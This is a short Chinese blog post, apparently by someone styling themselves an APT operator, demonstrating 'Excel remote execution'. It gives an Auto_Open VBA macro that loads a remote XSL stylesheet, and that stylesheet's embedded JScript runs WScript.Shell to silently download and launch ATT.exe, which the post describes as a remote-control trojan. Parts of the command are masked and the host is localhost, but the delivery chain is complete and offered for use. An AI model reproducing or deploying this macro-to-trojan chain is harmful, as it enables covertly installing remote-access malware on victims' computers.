---
title: EXCEL远程执行
author: APT - 0x44LL
date: 2021-01-17
category: Jekyll
layout: post
---

## EXCEL远程执行演示
<video src="/public/video/RemoteExecution.mp4" width="750px" height="500px" controls="controls"></video>

## 准备工作：<br>
**1.创建以下两个文件<br>**
<font color=Red>
excel.xsl<br>
ATT.xsl<br>
ATT.exe<br>
</font>
---

> excel.xsl

```
Sub Auto_Open()
    Set XML = CreateObject("Microsoft.XMLDOM")
    XML.async = False
    Set xsl = XML
    xsl.Load "http://127.0.0.1:80/ATT.xsl"
    XML.transformNode xsl
End Sub
***

> ATT.xsl

```
<xsl:stylesheet 
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:ms="urn:schemas-microsoft-com:xslt" 
xmlns:user="placeholder" 

version="1.0">
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd xxxxx -xx 127.0.1.1/ATT.exe xxxx/ATT.exe & start xxxx/ATT.exe",0);
  ]]>
</ms:script>
</xsl:stylesheet>
```

> ATT.exe

```
这是远控生成的木马
```

**<font color=Red face="黑体">将ATT.xsl调用ATT.exe执行,当excel.xsl打开就会进行远程加载ATT.xsl并下载在本地执行ATT.exe木马程序；</font>**

